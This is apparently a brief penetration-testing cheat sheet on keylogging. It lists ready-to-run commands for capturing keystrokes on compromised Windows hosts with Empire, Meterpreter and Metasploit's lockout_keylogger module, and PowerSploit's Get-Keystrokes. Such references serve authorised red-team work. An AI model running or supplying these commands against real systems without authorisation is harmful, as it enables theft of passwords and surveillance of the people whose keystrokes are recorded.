# Keylogging

### 1) Empire C2

    usemodule/powershell/collection/keylogger

### 2) Metasploit

##### Meterpreter

    keyscan_start
    keyscan_dump

##### Modules

    use post/windows/capture/lockout_keylogger

### 3) Powersploit

    Import-Module .\Exfiltration.psd1
    Get-Keystrokes -LogPath c:\key.log
